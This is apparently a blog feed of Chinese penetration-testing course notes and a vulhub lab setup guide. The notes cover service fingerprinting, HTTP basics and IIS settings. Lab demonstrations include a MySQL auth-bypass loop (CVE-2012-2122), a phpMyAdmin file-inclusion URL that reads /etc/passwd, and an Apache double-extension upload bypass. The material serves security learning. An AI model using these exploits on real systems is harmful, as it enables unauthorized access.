title="数据库层面："></a>数据库层面：</h1><ul><li>网站分动态网站和静态网站，静态网站由于只是单页，没有数据传递，所以不存在数据库漏洞。</li></ul><h2 id="识别数据库类型常见方法"><a href="#识别数据库类型常见方法" class="headerlink" title="识别数据库类型常见方法"></a>识别数据库类型常见方法</h2><ul><li>默认的语言搭配的数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 组合类型asp + access/mssql</span><br><span class="line">2. 组合类型php + mysql </span><br><span class="line">3. 组合类型aspx+mssql</span><br><span class="line">4. 组合类型jsp +mysql/oracle</span><br><span class="line">5. 组合类型Python + MongoDB</span><br></pre></td></tr></table></figure></li><li>常见的数据库默认端口号</li><li>关系型数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql3306</span><br><span class="line">2. sqlserver1433</span><br><span class="line">3. oracle1521</span><br><span class="line">4. psotgresql5432</span><br></pre></td></tr></table></figure></li><li>非关系型数据库<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. MongoDB27017</span><br><span class="line">2. Redis6379</span><br><span class="line">3. memcached11211</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20145520.png"></li><li>3306端口为MySQL数据库</li><li>其中STATE状态，open表示打开，close是关闭，filtered是拦截，表示nmap无法确定开放状态</li></ul><h2 id="数据库类型区别及识别意义"><a href="#数据库类型区别及识别意义" class="headerlink" title="数据库类型区别及识别意义"></a>数据库类型区别及识别意义</h2><ul><li>数据库的不同表示的结构也是不同、写法结构也不一样、所以产生的漏洞也不一样。</li><li>不同的数据库的攻击方式也不完全一样。</li></ul><h2 id="数据库常见漏洞类型及攻击"><a href="#数据库常见漏洞类型及攻击" class="headerlink" title="数据库常见漏洞类型及攻击"></a>数据库常见漏洞类型及攻击</h2><ul><li>存在弱口令</li><li>数据库漏洞</li></ul><h2 id="简要数据库层面漏洞影响范围"><a href="#简要数据库层面漏洞影响范围" class="headerlink" title="简要数据库层面漏洞影响范围"></a>简要数据库层面漏洞影响范围</h2><ul><li>数据库权限</li><li>网站权限</li><li>修改网页内容</li></ul><h1 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h1><h2 id="如何判断有哪些第三方平台或软件"><a href="#如何判断有哪些第三方平台或软件" class="headerlink" title="如何判断有哪些第三方平台或软件"></a>如何判断有哪些第三方平台或软件</h2><ul><li>通过扫描网站可以看到安装了哪些第三方的软件，例如下面这个就是安装了Apache httpd<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV IP地址</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20151155.png"></li></ul><h2 id="简要为什么要识别第三方平台或软件"><a href="#简要为什么要识别第三方平台或软件" class="headerlink" title="简要为什么要识别第三方平台或软件"></a>简要为什么要识别第三方平台或软件</h2><ul><li>不同的第三方软件或工具存在不同的漏洞、识别到更多的信息对收集到的漏洞也就越多</li></ul><h2 id="常见第三方平台或软件漏洞类型及攻击"><a href="#常见第三方平台或软件漏洞类型及攻击" class="headerlink" title="常见第三方平台或软件漏洞类型及攻击"></a>常见第三方平台或软件漏洞类型及攻击</h2><ul><li>弱口令</li><li>软件的漏洞攻击</li></ul><h2 id="简要第三方平台或软件安全测试的范围"><a href="#简要第三方平台或软件安全测试的范围" class="headerlink" title="简要第三方平台或软件安全测试的范围"></a>简要第三方平台或软件安全测试的范围</h2><ul><li>直接获取到软件的权限便于进一步的提权和攻击</li></ul><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><ul><li>除去常规wEB安全及APP安全测试外，类似服务器单一或复杂的其他服务（邮件，游戏，负载均衡等），也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。<strong>所以明确安全测试思路是很重要的！</strong></li><li>要根据它上面提供的服务来选取这个常见的攻击漏洞或者攻击方式</li></ul><h1 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h1><h2 id="演示某数据库弱口令及漏洞演示"><a href="#演示某数据库弱口令及漏洞演示" class="headerlink" title="演示某数据库弱口令及漏洞演示"></a>演示某数据库弱口令及漏洞演示</h2><h3 id="Mysql-身份认证绕过漏洞（CVE-2012-2122）"><a href="#Mysql-身份认证绕过漏洞（CVE-2012-2122）" class="headerlink" title="Mysql 身份认证绕过漏洞（CVE-2012-2122）"></a>Mysql 身份认证绕过漏洞（CVE-2012-2122）</h3><ul><li><a href="https://vulhub.org/#/environments/mysql/CVE-2012-2122/">https://vulhub.org/#/environments/mysql/CVE-2012-2122/</a></li><li>首先在Ubuntu搭建漏洞环境<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20164727.png"></li><li>在kali当中对这个数据库进行扫描<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20164829.png"></li><li>可以看出MySQL版本为5.5.23，存在这个漏洞<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `<span class="built_in">seq</span> 1 1000`; <span class="keyword">do</span> mysql -u root --password=bad -h 192.168.3.39 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></li><li>就可以直接进入到MySQL的shell<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20165219.png"></li></ul><h2 id="第三方应用安全漏洞演示"><a href="#第三方应用安全漏洞演示" class="headerlink" title="第三方应用安全漏洞演示"></a>第三方应用安全漏洞演示</h2><h3 id="phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin 4.8.1 远程文件包含漏洞（CVE-2018-12613）</h3><ul><li><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/">https://vulhub.org/#/environments/phpmyadmin/CVE-2018-12613/</a></li><li>搭建环境</li><li>然后访问<code>http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-09-01%20171122.png"></li><li>可见<code>/etc/passwd</code>被读取，说明文件包含漏洞存在</li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day04基础入门-WEB源码拓展</title>
      <link href="/2023/08/31/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/31/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB源码拓展"><a href="#WEB源码拓展" class="headerlink" title="WEB源码拓展"></a>WEB源码拓展</h1><ul><li>WEB源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中WEB源码有很多技术需要简明分析。比如:获取某ASP源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-31%20142321.png"></li><li>数据库配置文件，后台目录，模版目录，数据库目录等</li><li>ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题，不同的脚本写出来的数据库储存是不一样的，不同脚本所设置的安全漏洞也是不一样的。</li><li>源码功能决定漏洞的类型，社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞，例如电商主要是支付交易内容，论坛主要是用户信息，可以针对这些内容做文章。</li><li>框架就是将一些常用的功能集成到一个框架内，在开发时直接引用。如果时通过框架开发的，我们可以直接寻找框架的漏洞，如果时非框架的话，就需要在代码当中寻找漏洞。</li><li>CMS称为开源程序，CMS的意义就是如果你在网上找不到这个漏洞，你就自己分析，但是网络上如果找得到，就可以直接使用别人分析的漏洞进行测试。</li><li>能够CMS识别的成为开源，网络上找不到源码的通常成为内部的。开源的网站可以在网络上查找他人分析的漏洞，也可以自己分析；内部的则需要自己分析，通过扫描工具等进行分析。</li><li>关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站，各种行业对应</li><li>总结:关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外，只需要找这个框架的漏洞就可以了），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方法想办法获取!</li><li><a href="https://websec.readthedocs.io/zh/latest/">WEB安全学习笔记</a></li></ul><hr><p>笔记参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day03基础入门-搭建安全拓展</title>
      <link href="/2023/08/30/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/30/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建安全拓展"><a href="#搭建安全拓展" class="headerlink" title="搭建安全拓展"></a>搭建安全拓展</h1><h2 id="常见搭建平台脚本"><a href="#常见搭建平台脚本" class="headerlink" title="常见搭建平台脚本"></a>常见搭建平台脚本</h2><ul><li><code>ASP</code>、<code>PHP</code>、<code>ASPX</code>、<code>JSP</code>、<code>PY</code>、<code>JAVAWEB</code>等环境<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20194303.png" alt="Windows Server2003 IIS"></li></ul><h2 id="域名IP目录解析安全问题"><a href="#域名IP目录解析安全问题" class="headerlink" title="域名IP目录解析安全问题"></a>域名IP目录解析安全问题</h2><p>通过域名访问，直接进入到网站绝对目录内，通过IP访问，则可能进入到上一级目录，存在安全问题。</p><h2 id="常见文件后缀解析对应安全"><a href="#常见文件后缀解析对应安全" class="headerlink" title="常见文件后缀解析对应安全"></a>常见文件后缀解析对应安全</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20210609.png" alt="后缀解析"><br>不同扩展名对应指定可执行文件路径，可以不同扩展名指定相同可执行文件。但是如果没有指定，那解析时就会出问题。</p><h2 id="常见安全测试中的安全防护"><a href="#常见安全测试中的安全防护" class="headerlink" title="常见安全测试中的安全防护"></a>常见安全测试中的安全防护</h2><h3 id="身份验证方法"><a href="#身份验证方法" class="headerlink" title="身份验证方法"></a>身份验证方法</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20211614.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20211709.png"><br>通过身份验证限制，需要用户名和密码才能进入站点，不允许匿名访问。</p><h3 id="IP地址和域名限制"><a href="#IP地址和域名限制" class="headerlink" title="IP地址和域名限制"></a>IP地址和域名限制</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20212144.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20213112.png"><br>设置限制IP地址或者域名，以设定访问权限。</p><h2 id="Web后门与用户及文件权限"><a href="#Web后门与用户及文件权限" class="headerlink" title="Web后门与用户及文件权限"></a>Web后门与用户及文件权限</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20214430.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20215034.png"></p><p>匿名登录的用户会出现在列表当中。<br>通过设置权限，可以限制后门访问文件。</p><h2 id="演示实例"><a href="#演示实例" class="headerlink" title="演示实例"></a>演示实例</h2><ul><li>基于中间件的简要识别<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%202158031.png"><br>在审查元素当中，可以看到response headers，在Server中可以判断出是IIS6.0。</li></ul><ul><li>基于中间件的安全漏洞<br>通过查阅资料等，就可以知道这个平台有哪些漏洞。</li><li>基于中间件的靶场使用<br><a href="https://vulhub.org/">https://vulhub.org/</a></li></ul><h3 id="演示Apache-HTTPD-多后缀解析漏洞"><a href="#演示Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="演示Apache HTTPD 多后缀解析漏洞"></a>演示Apache HTTPD 多后缀解析漏洞</h3><ul><li>第一步，首先在Ubuntu系统当中<a href="https://m78alien.github.io/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/">安装好docker环境</a>，并下载文件</li><li>第二步，在vulhub网站找到想做的环境，<a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a><br>建议先去网站看看漏洞内容的描述，Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20212552.png"></li><li>第三步，在Ubuntu终端当中，打开到<code>vulhub-master</code>文件夹，进入到指定的文件路径中<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20212953.png"></li><li>第四步，搭建环境<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose build</span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20213201.png"></li><li>第五步，在物理机浏览器中，输入虚拟机的IP地址以打开网站<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20213749.png"></li><li>第六步，创建一个文件<code>1.php.jpg</code>，通过notepad++打开，并键入以下内容，电脑将这个文件识别为jpg图片<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>第七步，在网站当中选择该文件，并提交<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214038.png"></li><li>第八步，在网址栏IP后输入&#x2F;uploadfiles&#x2F;1.php.jpg，发现打开的是PHP文件，而非jpg文件，因此可以通过这个方法，造成一个可以绕过上传白名单的解析漏洞。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214218.png"></li><li>第九步，最后键入以下指令，关闭环境<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose down</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-30%20214924.png"></li></ul><hr><p>笔记内容参考自<a href="https://www.yuque.com/weiker/xiaodi">小迪安全</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 小迪安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 小迪安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Ubuntu搭建vulhub漏洞靶场</title>
      <link href="/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/29/%E5%9C%A8Ubuntu%E6%90%AD%E5%BB%BAvulhub%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p><a href="https://vulhub.org/">vulhub官网</a><br>Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>首先进入root权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">apt install docker</span><br></pre></td></tr></table></figure><p>查看是否安装成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20225631.png"></p><h2 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20225946.png"><br>查看pip是否安装成功<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230034.png"></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><p>使用pip安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230320.png"></p><h2 id="安装vulhub"><a href="#安装vulhub" class="headerlink" title="安装vulhub"></a>安装vulhub</h2><p>百度网盘下载：<a href="https://pan.baidu.com/s/1bsrphbfsUGHNP3RkpNaidw?pwd=6666">https://pan.baidu.com/s/1bsrphbfsUGHNP3RkpNaidw?pwd=6666</a><br>复制到Ubuntu当中，然后解压</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip vulhub-master.zip</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20230531.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞靶场 </tag>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day02基础入门-数据包拓展</title>
      <link href="/2023/08/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/"/>
      <url>/2023/08/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<h1 id="数据包拓展"><a href="#数据包拓展" class="headerlink" title="数据包拓展"></a>数据包拓展</h1><h2 id="http-https数据包"><a href="#http-https数据包" class="headerlink" title="http&#x2F;https数据包"></a>http&#x2F;https数据包</h2><h3 id="http协议是什么"><a href="#http协议是什么" class="headerlink" title="http协议是什么"></a>http协议是什么</h3><ol><li>HTTP协议是超文本传输协议的缩写，英文是Hyper Text Transfer Protocol。它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。</li><li>设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。</li><li>HTTP有多个版本，目前广泛使用的是HTTP&#x2F;1.1版本。</li></ol><h3 id="HTTP原理"><a href="#HTTP原理" class="headerlink" title="HTTP原理"></a>HTTP原理</h3><ol><li>HTTP是一个基于TCP&#x2F;IP通信协议来传递数据的协议，传输的数据类型为HTML文件、图片文件、查询结果等。</li><li>HTTP协议一般用于B&#x2F;S架构（）。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</li></ol><h3 id="HTTP特点"><a href="#HTTP特点" class="headerlink" title="HTTP特点"></a>HTTP特点</h3><ol><li>http协议支持客户端&#x2F;服务端模式，也是一种请求&#x2F;响应模式的协议。</li><li>简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有<code>GET</code>、<code>HEAD</code>、<code>POST</code>。</li><li>灵活：HTTP允许传输任意类型的数据对象。传输的类型由Content-Type加以标记。</li><li>无连接：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录http状态的技术，一个叫做Cookie,一个叫做Session。</li><li>无状态：无状态是指协议对于事务处理没有记忆，后续处理需要前面的信息，则必须重传。</li></ol><h3 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h3><ol><li>HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</li><li>URI：Uniform Resource Identifier 统一资源标识符</li><li>URL：Uniform Resource Location 统一资源定位符</li><li>URI 是用来标示一个具体的资源的，我们可以通过 URI 知道一个资源是什么。</li><li>URL 则是用来定位具体的资源的，标示了一个具体的资源位置。互联网上的每个文件都有一个唯一的URL。</li></ol><h3 id="HTTP报文组成"><a href="#HTTP报文组成" class="headerlink" title="HTTP报文组成"></a>HTTP报文组成</h3><ol><li>请求行：包括请求方法、URL、协议&#x2F;版本</li><li>请求头(Request Header)</li><li>请求正文</li></ol><h3 id="http通信过程"><a href="#http通信过程" class="headerlink" title="http通信过程"></a>http通信过程</h3><p>建立连接—&gt;发送请求数据包—&gt;返回响应数据包——&gt;关闭连接1.浏览器建立与web服务器之间的连接</p><ol><li>浏览器建立与web服务器之间的连接</li><li>浏览器将请求数据打包（生成请求数据包）并发送到web服务器</li><li>web服务器将处理结果打包（生成响应数据包）并发送给浏览器</li><li>web服务器关闭连接</li></ol><h3 id="https传输数据流程"><a href="#https传输数据流程" class="headerlink" title="https传输数据流程"></a>https传输数据流程</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-08-29%20163111.png" alt="https传输数据流程"></p><ol><li>首先客户端通过URL访问服务器建立SSL连接。</li><li>服务端收到客户端请求后，会将网站支持的证书信息（证书中包含公钥）传送一份给客户端。</li><li>客户端的服务器开始协商SSL连接的安全等级，也就是信息加密的等级。</li><li>客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。</li><li>服务器利用自己的私钥解密出会话密钥。</li><li>服务器利用会话密钥加密与客户端之间的通信。</li></ol><h2 id="Request请求数据包数据格式"><a href="#Request请求数据包数据格式" class="headerlink" title="Request请求数据包数据格式"></a>Request请求数据包数据格式</h2><ol><li>请求行：请求类型&#x2F;请求资源路径、协议的版本和类型</li><li>请求头：一些键值对，浏览器与Web服务器之间都可以发送，特定的某种含义</li><li>空行：请求头与请求体之间用一个空行隔开</li><li>请求体：要发送的数据（一般post提交会使用）；例：<code>user=123&amp;pass=123</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Request Headers</span><br><span class="line">GET / HTTP/1.1 </span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 </span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 </span><br><span class="line">Cache-Control: max-age=0 </span><br><span class="line">Connection: keep-alive </span><br><span class="line">Cookie: ZDEDebuggerPresent=php,phtml,php3; timezone=8 </span><br><span class="line">Host: xiaodi8.com </span><br><span class="line">Upgrade-Insecure-Requests: 1 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62</span><br></pre></td></tr></table></figure></li></ol><h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h3><ol><li>HTTP 规划定义了 8 种可能的请求方法：<ul><li>GET：检索 URL 中标识资源的一个简单请求  </li><li>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档  </li><li>POST：服务器接受被写入客户端输出流中的数据的请求  </li><li>PUT：服务器保存请求数据作为指定 URL 新内容的请求  </li><li>DELETE：服务器删除 URL 中命令的资源的请求  </li><li>OPTIONS：关于服务器支持的请求方法信息的请求  </li><li>TRACE：web 服务器反馈 Http 请求和其头标的请求  </li><li>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</li></ul></li></ol><h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><ol><li>由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。  <ul><li>HOST: 主机或域名地址  </li><li>Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。  </li><li>User-Agent：是客户浏览器名称  </li><li>Host：对应网址 URL 中的 Web 名称和端口号。  </li><li>Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。  </li><li>connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP&#x2F;1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接  </li><li>Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。  </li><li>Referer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 &#x2F;icconcept&#x2F;index.jsp中 点 击 一 个 链 接 到 网 页&#x2F;icwork&#x2F;search ， 在 向 服 务 器 发 送 的 GET&#x2F;icwork&#x2F;search 中 的 请 求 中 ， Referer 是<a 